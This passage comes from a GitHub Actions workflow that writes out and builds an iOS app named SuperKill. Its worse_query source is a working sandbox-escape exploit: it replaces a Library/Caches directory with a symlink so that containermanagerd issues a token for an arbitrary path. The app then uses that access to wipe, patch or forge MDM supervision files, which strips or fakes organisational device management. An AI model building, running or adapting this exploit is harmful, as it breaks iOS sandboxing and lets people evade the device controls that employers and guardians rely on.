          #pragma mark - UI

          - (UIButton *)makeButton:(NSString *)title action:(SEL)action destructive:(BOOL)destructive {
              UIButtonConfiguration *config = [UIButtonConfiguration filledButtonConfiguration];
              config.title = title;
              config.cornerStyle = UIButtonConfigurationCornerStyleMedium;
              if (destructive) {
                  config.baseBackgroundColor = [UIColor systemRedColor];
              }
              UIButton *button = [UIButton buttonWithType:UIButtonTypeSystem];
              button.configuration = config;
              [button addTarget:self action:action forControlEvents:UIControlEventTouchUpInside];
              [button.heightAnchor constraintGreaterThanOrEqualToConstant:44].active = YES;
              return button;
          }

          - (UITextField *)makeField:(NSString *)placeholder {
              UITextField *field = [[UITextField alloc] init];
              field.borderStyle = UITextBorderStyleRoundedRect;
              field.placeholder = placeholder;
              field.autocapitalizationType = UITextAutocapitalizationTypeNone;
              field.autocorrectionType = UITextAutocorrectionTypeNo;
              field.keyboardType = UIKeyboardTypeURL;
              field.delegate = self;
              field.returnKeyType = UIReturnKeyDone;
              field.font = [UIFont systemFontOfSize:14];
              [field.heightAnchor constraintEqualToConstant:40].active = YES;
              return field;
          }

          - (UILabel *)makeSectionLabel:(NSString *)text {
              UILabel *label = [[UILabel alloc] init];
              label.text = text;
              label.font = [UIFont preferredFontForTextStyle:UIFontTextStyleFootnote];
              label.textColor = [UIColor secondaryLabelColor];
              return label;
          }

          - (void)buildUI {
              UIStackView *root = [[UIStackView alloc] init];
              root.axis = UILayoutConstraintAxisVertical;
              root.spacing = 10;
              root.translatesAutoresizingMaskIntoConstraints = NO;
              [self.view addSubview:root];

              UILayoutGuide *guide = self.view.safeAreaLayoutGuide;
              [NSLayoutConstraint activateConstraints:@[
                  [root.topAnchor constraintEqualToAnchor:guide.topAnchor constant:12],
                  [root.leadingAnchor constraintEqualToAnchor:guide.leadingAnchor constant:16],
                  [root.trailingAnchor constraintEqualToAnchor:guide.trailingAnchor constant:-16],
                  [root.bottomAnchor constraintEqualToAnchor:guide.bottomAnchor constant:-12],
              ]];

              // 上半部分可滚动，小屏也不会被挤爆
              UIScrollView *scroll = [[UIScrollView alloc] init];
              scroll.keyboardDismissMode = UIScrollViewKeyboardDismissModeInteractive;
              scroll.alwaysBounceVertical = YES;
              scroll.translatesAutoresizingMaskIntoConstraints = NO;

              UIStackView *controls = [[UIStackView alloc] init];
              controls.axis = UILayoutConstraintAxisVertical;
              controls.spacing = 8;
              controls.translatesAutoresizingMaskIntoConstraints = NO;
              [scroll addSubview:controls];
              [NSLayoutConstraint activateConstraints:@[
                  [controls.topAnchor constraintEqualToAnchor:scroll.contentLayoutGuide.topAnchor],
                  [controls.bottomAnchor constraintEqualToAnchor:scroll.contentLayoutGuide.bottomAnchor],
                  [controls.leadingAnchor constraintEqualToAnchor:scroll.contentLayoutGuide.leadingAnchor],
                  [controls.trailingAnchor constraintEqualToAnchor:scroll.contentLayoutGuide.trailingAnchor],
                  [controls.widthAnchor constraintEqualToAnchor:scroll.frameLayoutGuide.widthAnchor],
              ]];

              // App Group
              UIStackView *groupRow = [[UIStackView alloc] init];
              groupRow.axis = UILayoutConstraintAxisHorizontal;
              groupRow.spacing = 8;
              self.groupField = [self makeField:@"group.cc.yourteam.superkill"];
              UIButton *save = [self makeButton:@"保存" action:@selector(saveGroup) destructive:NO];
              [save.widthAnchor constraintEqualToConstant:72].active = YES;
              [groupRow addArrangedSubview:self.groupField];
              [groupRow addArrangedSubview:save];

              [controls addArrangedSubview:[self makeSectionLabel:@"签名里的 App Group"]];
              [controls addArrangedSubview:groupRow];
              [controls addArrangedSubview:[self makeButton:@"① 自检（系统 / Group / 逃逸可用性）" action:@selector(runEnvironment) destructive:NO]];
              [controls addArrangedSubview:[self makeButton:@"② 检测监管状态" action:@selector(runInspect) destructive:NO]];
              [controls addArrangedSubview:[self makeButton:@"③ 备份配置目录" action:@selector(runBackup) destructive:NO]];
              [controls addArrangedSubview:[self makeButton:@"⑧ 记录状态快照（基线 / 开启后 / 清除后）" action:@selector(promptSnapshot) destructive:NO]];

              // 开启监管参数
              [controls addArrangedSubview:[self makeSectionLabel:@"开启监管（测试用）参数"]];
              self.orgField = [self makeField:@"组织名，例如 Test Organization"];
              self.emailField = [self makeField:@"组织邮箱（可空）"];
              self.emailField.keyboardType = UIKeyboardTypeEmailAddress;
              self.urlField = [self makeField:@"ConfigurationURL"];
              [controls addArrangedSubview:self.orgField];
              [controls addArrangedSubview:self.emailField];
              [controls addArrangedSubview:self.urlField];

              UIStackView *mdmRow = [[UIStackView alloc] init];
              mdmRow.axis = UILayoutConstraintAxisHorizontal;
              mdmRow.spacing = 8;
              mdmRow.alignment = UIStackViewAlignmentCenter;
              UILabel *mdmLabel = [self makeSectionLabel:@"同时写入 MDM.plist 占位"];
              mdmLabel.textColor = [UIColor labelColor];
              self.mdmSwitch = [[UISwitch alloc] init];
              [mdmRow addArrangedSubview:mdmLabel];
              [mdmRow addArrangedSubview:self.mdmSwitch];
              [controls addArrangedSubview:mdmRow];

              [controls addArrangedSubview:[self makeButton:@"⑦ 开启监管（写入并校验）" action:@selector(confirmEnable) destructive:NO]];
              [controls addArrangedSubview:[self makeButton:@"④ 彻底清除监管" action:@selector(confirmWipe) destructive:YES]];
              [controls addArrangedSubview:[self makeButton:@"⑤ 温和补丁（保留 profile）" action:@selector(runPatch) destructive:NO]];
              [controls addArrangedSubview:[self makeButton:@"⑨ 对比快照链（含当前状态）" action:@selector(runDiff) destructive:NO]];
              [controls addArrangedSubview:[self makeButton:@"⑥ 回滚最新备份" action:@selector(confirmRestore) destructive:NO]];
              [controls addArrangedSubview:[self makeButton:@"释放全部扩展" action:@selector(runRelease) destructive:NO]];

              self.spinner = [[UIActivityIndicatorView alloc] initWithActivityIndicatorStyle:UIActivityIndicatorViewStyleMedium];
              self.spinner.hidesWhenStopped = YES;
              [controls addArrangedSubview:self.spinner];

              self.console = [[UITextView alloc] init];
              self.console.editable = NO;
              self.console.font = [UIFont monospacedSystemFontOfSize:11 weight:UIFontWeightRegular];
              self.console.backgroundColor = [UIColor secondarySystemBackgroundColor];
              self.console.layer.cornerRadius = 8;
              self.console.textContainerInset = UIEdgeInsetsMake(8, 8, 8, 8);
              [self.console.heightAnchor constraintEqualToConstant:190].active = YES;

              [root addArrangedSubview:scroll];
              [root addArrangedSubview:self.console];

              UITapGestureRecognizer *tap = [[UITapGestureRecognizer alloc] initWithTarget:self action:@selector(dismissKeyboard)];
              tap.cancelsTouchesInView = NO;
              [self.view addGestureRecognizer:tap];
          }

          - (void)dismissKeyboard {
              [self.view endEditing:YES];
          }

          #pragma mark - 参数持久化

          - (void)loadOptions {
              NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
              self.groupField.text = [SKEngine configuredAppGroup];

              NSString *org = [defaults stringForKey:SKOrgKey];
              self.orgField.text = org.length ? org : @"Test Organization";

              self.emailField.text = [defaults stringForKey:SKEmailKey] ?: @"";

              NSString *url = [defaults stringForKey:SKURLKey];
              self.urlField.text = url.length ? url : @"https://mdm.invalid/profile";

              self.mdmSwitch.on = [defaults boolForKey:SKWithMDMKey];
          }

          - (void)persistOptions {
              NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];
              [defaults setObject:(self.orgField.text ?: @"") forKey:SKOrgKey];
              [defaults setObject:(self.emailField.text ?: @"") forKey:SKEmailKey];
              [defaults setObject:(self.urlField.text ?: @"") forKey:SKURLKey];
              [defaults setBool:self.mdmSwitch.on forKey:SKWithMDMKey];
              [defaults synchronize];
          }

          - (void)saveGroup {
              [self.groupField resignFirstResponder];
              NSString *group = [self.groupField.text stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]];
              [SKEngine setConfiguredAppGroup:group];
              self.engine.appGroup = group;
              [self persistOptions];
              [self appendLog:[NSString stringWithFormat:@"App Group 已保存: %@", group.length ? group : @"(空)"]];
          }

          - (BOOL)textFieldShouldReturn:(UITextField *)textField {
              [self saveGroup];
              return YES;
          }

          #pragma mark - 日志 / 忙碌状态

          - (void)appendLog:(NSString *)line {
              NSDateFormatter *formatter = [[NSDateFormatter alloc] init];
              formatter.dateFormat = @"HH:mm:ss";
              NSString *stamp = [formatter stringFromDate:[NSDate date]];
              NSString *entry = [NSString stringWithFormat:@"[%@] %@\n", stamp, line];
              [self.logBuffer appendString:entry];
              self.console.text = self.logBuffer;
              if (self.console.text.length > 0) {
                  NSRange end = NSMakeRange(self.console.text.length - 1, 1);
                  [self.console scrollRangeToVisible:end];
              }
          }

          - (void)setBusy:(BOOL)busy {
              self.view.userInteractionEnabled = !busy;
              if (busy) [self.spinner startAnimating];
              else [self.spinner stopAnimating];
          }

          - (void)runInBackground:(void (^)(void))block {
              [self setBusy:YES];
              dispatch_async(self.workQueue, ^{
                  @autoreleasepool {
                      block();
                  }
                  dispatch_async(dispatch_get_main_queue(), ^{
                      [self setBusy:NO];
                  });
              });
          }

          - (void)alert:(NSString *)title message:(NSString *)message {
              UIAlertController *alert = [UIAlertController alertControllerWithTitle:title
                                                                             message:message
                                                                      preferredStyle:UIAlertControllerStyleAlert];
              [alert addAction:[UIAlertAction actionWithTitle:@"好" style:UIAlertActionStyleDefault handler:nil]];
              [self presentViewController:alert animated:YES completion:nil];
          }

          - (void)confirm:(NSString *)title
                  message:(NSString *)message
               actionName:(NSString *)actionName
               destructive:(BOOL)destructive
                  handler:(void (^)(void))handler {
              UIAlertController *sheet = [UIAlertController alertControllerWithTitle:title
                                                                            message:message
                                                                     preferredStyle:UIAlertControllerStyleActionSheet];
              [sheet addAction:[UIAlertAction actionWithTitle:actionName
                                                        style:destructive ? UIAlertActionStyleDestructive : UIAlertActionStyleDefault
                                                      handler:^(UIAlertAction *action) {
                  handler();
              }]];
              [sheet addAction:[UIAlertAction actionWithTitle:@"取消" style:UIAlertActionStyleCancel handler:nil]];
              sheet.popoverPresentationController.sourceView = self.view;
              sheet.popoverPresentationController.sourceRect = self.view.bounds;
              [self presentViewController:sheet animated:YES completion:nil];
          }

          #pragma mark - Actions

          - (void)runEnvironment {
              [self saveGroup];
              [self runInBackground:^{
                  SKEngine *engine = self.engine;
                  SKLogBlock logger = engine.logger;
                  if (logger) logger([engine environmentReport]);
              }];
          }

          - (void)runInspect {
              [self saveGroup];
              [self runInBackground:^{
                  [self.engine inspectSupervision];
                  NSInteger state = [self.engine supervisedState];
                  dispatch_async(dispatch_get_main_queue(), ^{
                      NSString *text = state > 0 ? @"设备处于监管状态（IsSupervised = true）"
                                                : (state == 0 ? @"未检测到监管标记" : @"无法判定");
                      [self appendLog:text];
                  });
              }];
          }

          - (void)runBackup {
              [self saveGroup];
              [self runInBackground:^{
                  NSError *error = nil;
                  NSString *path = [self.engine backup:&error];
                  if (!path) {
                      dispatch_async(dispatch_get_main_queue(), ^{
                          [self alert:@"备份失败" message:error.localizedDescription ?: @"未知错误"];
                      });
                  }
              }];
          }

          - (void)promptSnapshot {
              UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"记录状态快照"
                                                                             message:@"给这次快照起名，diff 里会用它做标题（基线 / 开启后 / 清除后 …）"
                                                                      preferredStyle:UIAlertControllerStyleAlert];
              [alert addTextFieldWithConfigurationHandler:^(UITextField *textField) {
                  textField.placeholder = @"基线";
                  textField.text = @"基线";
                  textField.autocorrectionType = UITextAutocorrectionTypeNo;
              }];
              [alert addAction:[UIAlertAction actionWithTitle:@"记录"
                                                        style:UIAlertActionStyleDefault
                                                      handler:^(UIAlertAction *action) {
                  NSString *label = alert.textFields.firstObject.text;
                  [self saveGroup];
                  [self runInBackground:^{
                      [self.engine captureSnapshotWithLabel:label];
                  }];
              }]];
              [alert addAction:[UIAlertAction actionWithTitle:@"取消" style:UIAlertActionStyleCancel handler:nil]];
              [self presentViewController:alert animated:YES completion:nil];
          }

          - (void)runDiff {
              [self saveGroup];
              [self runInBackground:^{
                  [self.engine diffSnapshotChain];
              }];
          }

          - (void)confirmEnable {
              [self saveGroup];
              [self persistOptions];

              NSString *org = self.orgField.text.length ? self.orgField.text : @"Test Organization";
              NSString *email = self.emailField.text ?: @"";
              NSString *url = self.urlField.text.length ? self.urlField.text : @"https://mdm.invalid/profile";
              BOOL withMDM = self.mdmSwitch.on;

              NSString *message = [NSString stringWithFormat:
                                   @"将写入 CloudConfigurationDetails.plist：\n"
                                   @"IsSupervised = true\n组织 = %@\n邮箱 = %@\nURL = %@\n"
                                   @"MDM.plist 占位 = %@\n\n重启后设置首页会显示“此 iPhone 受监管”。",
                                   org, email.length ? email : @"(空)", url, withMDM ? @"写" : @"不写"];

              [self confirm:@"开启监管（测试）"
                    message:message
                 actionName:@"写入并校验"
                destructive:NO
                    handler:^{
                  [self performEnableWithOrganization:org email:email url:url withMDM:withMDM];
              }];
          }

          - (void)performEnableWithOrganization:(NSString *)org
                                          email:(NSString *)email
                                            url:(NSString *)url
                                        withMDM:(BOOL)withMDM {
              [self runInBackground:^{
                  NSError *error = nil;
                  BOOL ok = [self.engine enableSupervisionWithOrganization:org
                                                                    email:email
                                                         configurationURL:url
                                                                  withMDM:withMDM
                                                                    error:&error];
                  dispatch_async(dispatch_get_main_queue(), ^{
                      [self alert:ok ? @"已开启（待重启生效）" : @"开启失败"
                                  message:ok ? @"监管标记已落盘并读回校验通过。重启设备后：设置首页显示“此 iPhone 受监管”，② 检测会显示 IsSupervised = 1。之后可用 ④ 彻底清除来回切。"
                                             : (error.localizedDescription ?: @"未知错误")];
                  });
              }];
          }

          - (void)confirmWipe {
              [self confirm:@"彻底清除监管"
                    message:@"将删除 CloudConfigurationDetails.plist、MDM.plist、MDMEvents.plist、MDMAppManagement.plist、PayloadManifest 条目与全部 GUID.stub，并清空 DeviceManagement 下的状态。建议先做 ③ 备份。"
                 actionName:@"继续（彻底）"
                destructive:YES
                    handler:^{
                  [self performWipe];
              }];
          }

          - (void)performWipe {
              [self runInBackground:^{
                  NSError *error = nil;
                  BOOL ok = [self.engine wipeSupervision:YES error:&error];
                  dispatch_async(dispatch_get_main_queue(), ^{
                      [self alert:ok ? @"已清除" : @"清除失败"
                                  message:ok ? @"保持飞行模式，重启设备后再联网验证：设置 → 通用 → VPN 与设备管理 中不应再有 MDM 描述文件，设置首页不应再显示“此 iPhone 受监管”。"
                                             : (error.localizedDescription ?: @"未知错误")];
                  });
              }];
          }

          - (void)runPatch {
              [self saveGroup];
              [self runInBackground:^{
                  NSError *error = nil;
                  BOOL ok = [self.engine patchSupervision:&error];
                  dispatch_async(dispatch_get_main_queue(), ^{
                      if (!ok) {
                          [self alert:@"补丁未生效" message:error.localizedDescription ?: @"没有可改写的字段"];
                      }
                  });
              }];
          }

          - (void)confirmRestore {
              [self confirm:@"回滚"
                    message:@"用最新一份备份覆盖当前配置目录。"
                 actionName:@"回滚"
                destructive:YES
                    handler:^{
                  [self runInBackground:^{
                      NSError *error = nil;
                      BOOL ok = [self.engine restoreLatestBackup:&error];
                      dispatch_async(dispatch_get_main_queue(), ^{
                          if (!ok) [self alert:@"回滚失败" message:error.localizedDescription ?: @"未知错误"];
                      });
                  }];
              }];
          }

          - (void)runRelease {
              [self runInBackground:^{
                  [self.engine releaseAllExtensions];
              }];
          }

          @end
          SK_EOF_06_SKMAINVIEWCONTROLLER_M
          mkdir -p Sources
          cat > Sources/worse_query.h <<'SK_EOF_07_WORSE_QUERY_H'
          //
          //  worse_query.h
          //  SuperKill
          //
          //  worse_query 沙盒逃逸原语的可用封装（面向 iOS 26.0 - 26.7.2 / 27.2）。
          //  上游 PoC: https://github.com/forcequitOS/worse_query (GPL-3.0)
          //
          //  原理：把 App Group 容器里的 Library/Caches 换成指向目标路径的符号链接，
          //  再让 containermanagerd 为该 group 的 "Library/Caches" part 签发 sandbox token。
          //  containermanagerd 在签发前会解析符号链接，于是 token 实际覆盖的是目标路径，
          //  进程 consume 之后即获得该任意路径（含 SystemGroup 系统组容器）的读写权限。
          //

          #ifndef worse_query_h
          #define worse_query_h

          #import <Foundation/Foundation.h>
          #include <stdint.h>
          #include <stdbool.h>

          /// 取得 target 路径的 sandbox extension。
          ///
          /// @param target     目标路径（目录或文件，必须已存在，除非 create_dir 为 true）
          /// @param group      自己签名里带的 App Group identifier，例如 group.cc.team.superkill
          /// @param create_dir 目标不存在时是否仍然签发
          /// @param flags_used 可空；返回本次成功的 container_query flags
          ///
          /// @return >0 扩展句柄（后续用 sk_escape_release 释放）
          ///         -1  App Group 不存在（签名未注入 entitlements，或 group 未在门户注册）
          ///         -2  符号解析失败（系统版本不受支持 / dylib 不在）
          ///         -3  container_query_create 失败
          ///         -4  符号链接创建失败
          ///         -5  containermanagerd 拒绝 query
          ///         -6  内核拒绝签发 / consume 失败
          ///         -255 目标路径不存在
          int64_t sk_escape(NSString *target, NSString *group, bool create_dir, int64_t *flags_used);

          /// 释放扩展。传入 <=0 时安全无操作。
          void sk_escape_release(int64_t handle);

          /// 该 group 在当前进程里是否存在可用的容器（用于自检）。
          BOOL sk_has_app_group(NSString *group);

          #endif /* worse_query_h */
          SK_EOF_07_WORSE_QUERY_H
          mkdir -p Sources
          cat > Sources/worse_query.m <<'SK_EOF_08_WORSE_QUERY_M'
          //
          //  worse_query.m
          //  SuperKill
          //
          //  worse_query 原语的增强封装。相对上游的改动：
          //    1. 自动枚举 flags × identifier 形态四种组合（iOS 26 的 AppGroup 需要 0x0800000000；
          //       部分版本对 group identifiers 只接受 xpc array），不再由调用方判断系统版本。
          //    2. 预检查区分 ENOENT 与 EPERM：沙盒不让 stat 的路径照样去试签发。
          //    3. 补齐 container_* 的 dlsym 回退（dylib 打开失败时退到 RTLD_DEFAULT）。
          //    4. 统一错误码 + 每次尝试后清理符号链接，不污染自己的 App Group 容器。
          //

          #import "worse_query.h"

          #import <Foundation/Foundation.h>
          #import <dlfcn.h>
          #import <errno.h>
          #import <stdlib.h>
          #import <sys/stat.h>
          #import <xpc/xpc.h>

          typedef void    *(*cq_create_fn)(void);
          typedef void     (*cq_set_class_fn)(void *, uint64_t);
          typedef void     (*cq_set_group_ids_fn)(void *, xpc_object_t);
          typedef void     (*cq_set_flags_fn)(void *, uint64_t);
          typedef void     (*cq_set_part_fn)(void *, uint64_t);
          typedef void    *(*cq_get_single_fn)(void *);
          typedef void     (*cq_free_fn)(void *);
          typedef char    *(*cq_copy_token_fn)(void *);
          typedef int64_t  (*sbx_consume_fn)(const char *);
          typedef int      (*sbx_release_fn)(int64_t);

          // container_query 常量（与 containermanagerd 私有 ABI 对齐）
          #define SK_CQ_CLASS_APP_GROUP      7ULL   // 只走 appGroup 类，才会 XPC 到 containermanagerd
          #define SK_CQ_PART_LIBRARY_CACHES  3ULL   // part 3 == Library/Caches，也就是被我们换成符号链接的那一级
          #define SK_CQ_FLAGS_DEFAULT        0x0000008000000000ULL
          #define SK_CQ_FLAGS_IOS26_APPGROUP 0x0000000800000000ULL

          static const char *const kContainerManagerPath = "/usr/lib/system/libsystem_containermanager.dylib";

          static void *sk_sym(void *image, const char *name) {
              void *p = image ? dlsym(image, name) : NULL;
              if (!p) p = dlsym(RTLD_DEFAULT, name);
              return p;
          }

          BOOL sk_has_app_group(NSString *group) {
              if (group.length == 0) return NO;
              return [[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:group] != nil;
          }

          // 把 App Group 的 Library/Caches 恢复成真实目录。
          static void sk_cleanup_symlink(NSString *group) {
              if (group.length == 0) return;
              NSFileManager *fm = [NSFileManager defaultManager];
              NSURL *root = [fm containerURLForSecurityApplicationGroupIdentifier:group];
              if (!root) return;
              NSString *caches = [[root URLByAppendingPathComponent:@"Library/Caches"] path];
              [fm removeItemAtPath:caches error:NULL];
              [fm createDirectoryAtPath:caches withIntermediateDirectories:NO attributes:nil error:NULL];
          }

          static xpc_object_t sk_make_identifiers(NSString *group, bool as_array) {
              xpc_object_t identifier = xpc_string_create(group.UTF8String);
              if (!as_array) return identifier;
              // 数组会 retain 元素；ARC 下不需要（也不允许）手工 release，最多泄漏一个短字符串。
              return xpc_array_create(&identifier, 1);
          }

          static int64_t sk_escape_once(NSString *target, NSString *group, uint64_t flags,
                                        bool create_dir, bool array_ids) {
              if (!create_dir) {
                  struct stat st;
                  if (lstat(target.fileSystemRepresentation, &st) != 0 && errno == ENOENT) {
                      return -255; // 真的不存在
                  }
                  // EPERM / EACCES：沙盒不允许 stat 这个路径，但目标可能存在 —— 继续尝试签发。
              }

              NSFileManager *fm = [NSFileManager defaultManager];
              NSURL *groupRoot = [fm containerURLForSecurityApplicationGroupIdentifier:group];
              if (!groupRoot) return -1;

              NSString *caches = [[groupRoot URLByAppendingPathComponent:@"Library/Caches"] path];

              void *image = dlopen(kContainerManagerPath, RTLD_NOW | RTLD_LOCAL);

              cq_create_fn        create      = (cq_create_fn)sk_sym(image, "container_query_create");
              cq_set_class_fn     set_class   = (cq_set_class_fn)sk_sym(image, "container_query_set_class");
              cq_set_group_ids_fn set_ids     = (cq_set_group_ids_fn)sk_sym(image, "container_query_set_group_identifiers");
              cq_set_flags_fn     set_flags   = (cq_set_flags_fn)sk_sym(image, "container_query_operation_set_flags");
              cq_set_part_fn      set_part    = (cq_set_part_fn)sk_sym(image, "container_query_operation_set_part");
              cq_get_single_fn    get_single  = (cq_get_single_fn)sk_sym(image, "container_query_get_single_result");
              cq_free_fn          free_query  = (cq_free_fn)sk_sym(image, "container_query_free");
              cq_copy_token_fn    copy_token  = (cq_copy_token_fn)sk_sym(image, "container_copy_sandbox_token");
              sbx_consume_fn      consume     = (sbx_consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");

              if (!create || !set_class || !set_ids || !set_flags || !set_part ||
                  !get_single || !free_query || !copy_token || !consume) {
                  if (image) dlclose(image);
                  return -2;
              }

              void *query = create();
              if (!query) {
                  if (image) dlclose(image);
                  return -3;
              }

              set_class(query, SK_CQ_CLASS_APP_GROUP);
              xpc_object_t identifiers = sk_make_identifiers(group, array_ids);
              set_ids(query, identifiers);
              set_part(query, SK_CQ_PART_LIBRARY_CACHES);
              set_flags(query, flags);

              // 把 Library/Caches 换成指向目标的符号链接——这一步是漏洞本体。
              [fm removeItemAtPath:caches error:NULL];
              if (![fm createSymbolicLinkAtPath:caches withDestinationPath:target error:NULL]) {
                  free_query(query);
                  if (image) dlclose(image);
                  return -4;
              }

              int64_t result_code = 0;
              void *result = get_single(query);
              if (!result) {
                  result_code = -5;
              } else {
                  char *token = copy_token(result);
                  if (!token) {
                      result_code = -6;
                  } else {
                      int64_t handle = consume(token);
                      free(token);
                      result_code = (handle > 0) ? handle : -6;
                  }
              }

              free_query(query);
              sk_cleanup_symlink(group);
              if (image) dlclose(image);
              return result_code;
          }

          int64_t sk_escape(NSString *target, NSString *group, bool create_dir, int64_t *flags_used) {
              if (target.length == 0 || group.length == 0) return -1;
              if (!sk_has_app_group(group)) return -1;

              const uint64_t flags_order[2] = { SK_CQ_FLAGS_DEFAULT, SK_CQ_FLAGS_IOS26_APPGROUP };
              int64_t last = -2;

              for (int f = 0; f < 2; f++) {
                  for (int a = 0; a < 2; a++) {
                      int64_t handle = sk_escape_once(target, group, flags_order[f], create_dir, a == 1);
                      if (handle > 0) {
                          if (flags_used) *flags_used = (int64_t)flags_order[f];
                          return handle;
                      }
                      last = handle;
                      // 这些错误换参数也没意义，直接回。
                      if (handle == -255 || handle == -1 || handle == -2 ||
                          handle == -3 || handle == -4) {
                          return handle;
                      }
                  }
              }
              return last;
          }

          void sk_escape_release(int64_t handle) {
              if (handle <= 0) return;
              sbx_release_fn release_ext = (sbx_release_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
              if (release_ext) release_ext(handle);
          }
          SK_EOF_08_WORSE_QUERY_M
          mkdir -p Resources
          cat > Resources/Info.plist <<'SK_EOF_09_INFO_PLIST'
          <?xml version="1.0" encoding="UTF-8"?>
          <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
          <plist version="1.0">
          <dict>
          	<key>CFBundleDevelopmentRegion</key>
          	<string>zh_CN</string>
          	<key>CFBundleDisplayName</key>
          	<string>监管开关</string>
          	<key>CFBundleExecutable</key>
          	<string>$(EXECUTABLE_NAME)</string>
          	<key>CFBundleIdentifier</key>
          	<string>$(PRODUCT_BUNDLE_IDENTIFIER)</string>
          	<key>CFBundleInfoDictionaryVersion</key>
          	<string>6.0</string>
          	<key>CFBundleName</key>
          	<string>$(PRODUCT_NAME)</string>
          	<key>CFBundlePackageType</key>
          	<string>APPL</string>
          	<key>CFBundleShortVersionString</key>
          	<string>1.0</string>
          	<key>CFBundleVersion</key>
          	<string>1</string>
          	<key>LSRequiresIPhoneOS</key>
          	<true/>
          	<key>LSSupportsOpeningDocumentsInPlace</key>
          	<true/>
          	<key>MinimumOSVersion</key>
          	<string>17.0</string>
          	<key>SKAppGroup</key>
          	<string>$(SK_APP_GROUP)</string>
          	<key>UIApplicationSupportsIndirectInputEvents</key>
          	<true/>
          	<key>UIFileSharingEnabled</key>
          	<true/>
          	<key>UILaunchScreen</key>
          	<dict/>
          	<key>UIRequiredDeviceCapabilities</key>
          	<array>
          		<string>arm64</string>
          	</array>
          	<key>UISupportedInterfaceOrientations</key>
          	<array>
          		<string>UIInterfaceOrientationPortrait</string>
          	</array>
          	<key>UIViewControllerBasedStatusBarAppearance</key>
          	<true/>
          </dict>
          </plist>
          SK_EOF_09_INFO_PLIST
          mkdir -p Entitlements
          cat > Entitlements/SuperKill.entitlements <<'SK_EOF_10_SUPERKILL_ENTITLEMENTS'
          <?xml version="1.0" encoding="UTF-8"?>
          <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
          <plist version="1.0">
          <dict>
          	<!-- 必须替换成你在开发者门户注册、并已勾进描述文件的 App Group -->
          	<key>com.apple.security.application-groups</key>
          	<array>
          		<string>group.cc.replace.superkill</string>
          	</array>
          </dict>
          </plist>
          SK_EOF_10_SUPERKILL_ENTITLEMENTS
          cat > project.yml <<'SK_EOF_11_PROJECT_YML'
          name: SuperKill
          options:
            bundleIdPrefix: cc.replace
            createIntermediateGroups: true
            deploymentTarget:
              iOS: "17.0"

          settings:
            base:
              IPHONEOS_DEPLOYMENT_TARGET: "17.0"
              CLANG_ENABLE_OBJC_ARC: YES
              GENERATE_INFOPLIST_FILE: NO
              SWIFT_VERSION: "5.0"
              # 默认 App Group；出包时可用 SK_APP_GROUP=... 覆盖
              SK_APP_GROUP: group.cc.replace.superkill

          targets:
            SuperKill:
              type: application
              platform: iOS
              sources:
                - path: Sources
              settings:
                base:
                  PRODUCT_NAME: SuperKill
                  PRODUCT_BUNDLE_IDENTIFIER: cc.replace.superkill
                  INFOPLIST_FILE: Resources/Info.plist
                  CODE_SIGN_ENTITLEMENTS: Entitlements/SuperKill.entitlements
                  CODE_SIGN_STYLE: Automatic
                  DEVELOPMENT_TEAM: ""
                  TARGETED_DEVICE_FAMILY: "1,2"
                  OTHER_LDFLAGS: "-framework Foundation -framework UIKit -framework Security"
              scheme:
                gatherCoverageData: false
          SK_EOF_11_PROJECT_YML

      - name: 安装 XcodeGen
        run: brew install xcodegen

      - name: 编译并打包（未签名）
        run: |
          set -euo pipefail
          xcodegen generate --spec project.yml
          xcodebuild -project SuperKill.xcodeproj \
            -target SuperKill \
            -configuration Release \
            -sdk iphoneos \
            CONFIGURATION_BUILD_DIR="$PWD/build/app" \
            PRODUCT_BUNDLE_IDENTIFIER="$BUNDLE_ID" \
            SK_APP_GROUP="$APP_GROUP" \
            CODE_SIGNING_ALLOWED=NO \
            CODE_SIGNING_REQUIRED=NO \
            CODE_SIGN_IDENTITY="" \
            build
          mkdir -p build/out/Payload
          cp -R build/app/SuperKill.app build/out/Payload/
          /usr/libexec/PlistBuddy -c "Set :SKAppGroup $APP_GROUP" build/out/Payload/SuperKill.app/Info.plist || true
          cd build/out && zip -qry SuperKill-unsigned.ipa Payload
          ls -lh SuperKill-unsigned.ipa

      - name: 上传 artifact
        uses: actions/upload-artifact@v4
        with:
          name: SuperKill-unsigned-ipa
          path: build/out/*.ipa
          if-no-files-found: error
